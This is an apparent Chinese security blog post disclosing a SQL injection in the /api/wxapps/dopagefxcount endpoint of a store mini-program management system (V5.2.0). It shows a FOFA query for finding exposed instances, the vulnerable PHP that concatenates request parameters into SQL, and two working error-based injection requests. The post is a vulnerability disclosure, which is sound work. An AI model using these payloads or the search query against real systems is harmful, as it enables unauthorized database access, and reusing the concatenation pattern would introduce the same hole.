---
title: "万能门店小程序管理系统 /api/wxapps/dopagefxcount SQL 注入漏洞"
source: https://mrxn.net/jswz/api-wxapps-dopagefxcount-sqli.html
asset_dir: assets/万能门店小程序管理系统-apiwxappsdopagefxcount-sql-注入漏洞
---

# 万能门店小程序管理系统 /api/wxapps/dopagefxcount SQL 注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/16 18:18
- 510浏览
- [0评论](#comment)
- 20分钟阅读

深入探索

网络安全会议

安全

文本剥离工具

---

# 漏洞简介

万能门店小程序管理系统是一款功能强大的工具，旨在为各行业商家提供线上线下融合的全方位解决方案。是一个集成了会员管理和会员营销两大核心功能的综合性平台。它支持多行业使用，通过后台一键切换版本，满足不同行业商家的个性化需求。该系统采用轻量后台，搭载高效服务器，确保小程序运行流畅，提升用户体验。万能门店小程序管理系统 /api/wxapps/dopagefxcount 存在 [SQL 注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，攻击者可通过该漏洞获取数据库中的敏感信息，甚至可能进一步控制服务器。

SQL注入防护

# 影响版本

万能门店小程序全开源独立版V5.2.0

# fofa语法

> `body="/new_plat/index.html#/login" || (body="/comhome/cases/index.html" && body="/Comhome/functionshow/index.html")`

# 漏洞分析

深入探索

Web安全书籍

技术文章订阅

安全认证考试

application/api/controller/Wxapps.php

```
    // 分销订单数据统计
    public function dopagefxcount()
    {
        $uniacid = input("uniacid");
        $suid = input("suid");
        $prefix = config('database.prefix');
        $orders1 = count(Db::query("SELECT * FROM {$prefix}wd_xcx_fx_ls WHERE uniacid=" . $uniacid . " and flag = 1 and (parent_id = '" . $suid . "' or p_parent_id = '" . $suid . "' or p_p_parent_id = '" . $suid . "')"));
        $orders2 = count(Db::query("SELECT * FROM {$prefix}wd_xcx_fx_ls WHERE uniacid=" . $uniacid . " and flag = 2 and (parent_id = '" . $suid . "' or p_parent_id = '" . $suid . "' or p_p_parent_id = '" . $suid . "')"));
        $orders3 = count(Db::query("SELECT * FROM {$prefix}wd_xcx_fx_ls WHERE uniacid=" . $uniacid . " and flag = 3 and (parent_id = '" . $suid . "' or {$prefix}p_parent_id = '" . $suid . "' or p_p_parent_id = '" . $suid . "')"));
        $data = array(
            "onecount" => $orders1,
            "twocount" => $orders2,
            "threecount" => $orders3,
            "total" => $orders1 + $orders2 + $orders3
        );
        $result['data'] = $data;
        return json_encode($result);
    }
```

`$uniacid` 和 `$suid` 直接拼接进SQL语句，从而造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
POST /api/wxapps/dopagefxcount HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: application/x-www-form-urlencoded

uniacid=1+AND+GTID_SUBSET(CONCAT((SELECT(md5(123456)))),3119)%23
```

[![万能门店小程序管理系统 /api/wxapps/dopagefxcount SQL 注入漏洞](images/img-001-645250d9dddb.webp)](https://image.mrxn.net/68fc652614054bbfb4fbe5afdd81383c.webp)

```
POST /api/wxapps/dopagefxcount HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: application/x-www-form-urlencoded

suid=1'+AND+GTID_SUBSET(CONCAT((SELECT(md5(123456)))),3119)+and+'1'='1&uniacid=1
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
